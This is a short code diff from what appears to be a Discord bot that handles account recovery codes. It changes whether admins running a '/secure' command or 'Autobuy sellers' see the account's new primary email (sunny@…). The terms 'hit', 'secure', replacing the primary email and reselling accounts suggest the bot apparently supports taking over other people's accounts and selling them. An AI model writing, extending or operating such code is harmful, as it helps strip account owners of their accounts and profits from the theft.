@@ -88,7 +88,8 @@ class recoveryCodeModal(ui.Modal):
             return
 
         if isinstance(account, dict) and account.get("failed"):
-            fail_embed = account.get("seller_embed") or account["hit_embed"]
+            # /secure is admin — show current primary (sunny@), not seller-hidden email
+            fail_embed = account.get("hit_embed") or account.get("seller_embed")
             await interaction.followup.send(embed=fail_embed, ephemeral=True)
             if not await _send_failure_dm(interaction.user, fail_embed):
                 await interaction.followup.send("Could not DM you — enable DMs from server members.", ephemeral=True)
@@ -115,7 +116,7 @@ class recoveryCodeModal(ui.Modal):
             await _send_failure_dm(interaction.user, fail_embed)
             return
 
-        # Seller DM: never include new primary (sunny@…) — use seller_embed only.
+        # /secure admin DM: hit_embed includes new primary. Autobuy sellers use seller_embed.
         await interaction.user.send(
-            embed=account.get("seller_embed") or account["hit_embed"],
+            embed=account.get("hit_embed") or account["seller_embed"],
         )
